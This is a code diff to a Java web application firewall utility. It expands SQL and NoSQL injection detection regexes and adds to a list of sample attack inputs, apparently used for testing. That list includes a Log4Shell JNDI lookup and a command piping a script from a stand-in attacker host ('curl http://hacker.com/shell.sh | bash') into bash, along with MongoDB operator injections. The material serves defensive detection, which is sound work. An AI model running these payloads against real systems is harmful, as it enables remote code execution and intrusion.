@@ -73,12 +73,22 @@ public class WAFUtils {
     /**
      * Potential SQL injection evasion. SQL query commands, functions, params and NoSQL Injection
      */
+    /**
+     * A compiled list of regex patterns designed to intercept malicious payloads.
+     */
     public static final List<Pattern> SQL_PATTERNS = List.of(
+            // Standard SQL Injections (Boolean inference, tautologies, union-based)
             Pattern.compile("(?si)'\\s*+(?:;|--|#)|;\\s*+--|(?:^|\\s|['\";()*-])(?:or|and)\\s+'?[0-9a-zA-Z]+'?\\s*+=\\s*+'?[0-9a-zA-Z]+'?|'\\s*+(?:or|and|where|not|union)(?=\\s|$|['\";()*-])"),
+
+            // Standard SQL Injections (Data manipulation and subqueries)
             Pattern.compile("(?si)(?:['\";)]|/\\*|--)\\s*\\b(?:delete\\s+from|update\\s+\\w+\\s+set|insert\\s+into|select\\s+[^;]{1,100}?\\s+from)\\b"),
+
+            // Advanced SQL Injections (Schema manipulation, system execution, time-based blind SQLi)
             Pattern.compile("(?si)\\b(?:union\\s+(?:all\\s+)?select|drop\\s+(?:table|database|user)|create\\s+table|benchmark\\s*\\(|exec\\s+xp_|into\\s+outfile|cmdshell|user_name\\s*\\(|information_schema|waitfor\\s+delay|pg_sleep|dbms_pipe\\.receive_message|sleep\\s*\\()\\b"),
-            // NoSQL Injection (MongoDB, CouchDB) often targeting REST JSON APIs
-            Pattern.compile("(?si)\"(?:\\$eq|\\$ne|\\$gt|\\$gte|\\$lt|\\$lte|\\$in|\\$nin|\\$exists|\\$type|\\$regex|\\$where)\"\\s*:")
+
+            // NoSQL Injection (MongoDB, CouchDB) targeting REST JSON APIs and SpEL (Spring Expression Language).
+            // This updated pattern captures both standard JSON structure ("$gt":) and SpEL interpolation (${gt:}).
+            Pattern.compile("(?si)(?:\"\\$|\\$\\{\\s*['\"]?)(?:eq|ne|gt|gte|lt|lte|in|nin|exists|type|regex|where)['\"]?\\s*:")
     );
 
     /**
@@ -364,8 +374,13 @@ public class WAFUtils {
                 "${jndi:ldap://hacker.com/Exploit}",
                 "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}",
                 "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")",
-                // NoSQL Injection (JSON body)
+                
+                // NoSQL injection payload simulating a SpEL/interpolation attack (JSON body)
                 "\"$ne\": 1",
+               "{\"query\": \"${gt: ''}\"}",
+                // A classic MongoDB injection payload
+                "{\"username\": {\"$gt\": \"\"}}",
+
                 // OS Command Injection
                 "; curl http://hacker.com/shell.sh | bash",
                 // Advanced Path Traversal & LFI
